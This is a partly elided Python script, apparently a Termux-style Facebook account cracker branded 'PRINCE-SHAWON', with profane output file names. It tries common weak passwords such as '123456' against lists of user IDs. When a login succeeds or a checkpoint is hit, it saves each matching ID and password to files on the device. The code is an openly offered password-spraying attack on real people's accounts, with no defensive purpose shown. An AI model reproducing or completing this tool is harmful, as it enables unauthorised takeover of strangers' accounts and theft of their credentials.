...
def main():
    ...
    print("—"*20)
    print("[1] CRACK NOW M1")
    print("[2] CRACK FUCK M2")
    print("—"*20)
    ask=input("CYBER KING SHAWON  !>")
    print("—"*20)
    if ask in["1"]:
        star="10000"
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in rp:
                print(f"\r\r [PRINCE-SHAWON] {uid} • {pw}")
                open("/sdcard/PRINCE-SHAWON-𝐅𝐔𝐂𝐊 𝐘𝐎𝐔𝐑 𝐆𝐅.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r [PRINCE-SHAWON] {uid} • {pw}")
                open("/sdcard/PRINCE-SHAWON-𝐃𝐀𝐓𝐀 𝐖𝐈𝐅𝐈 𝐖𝐎𝐑𝐊.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
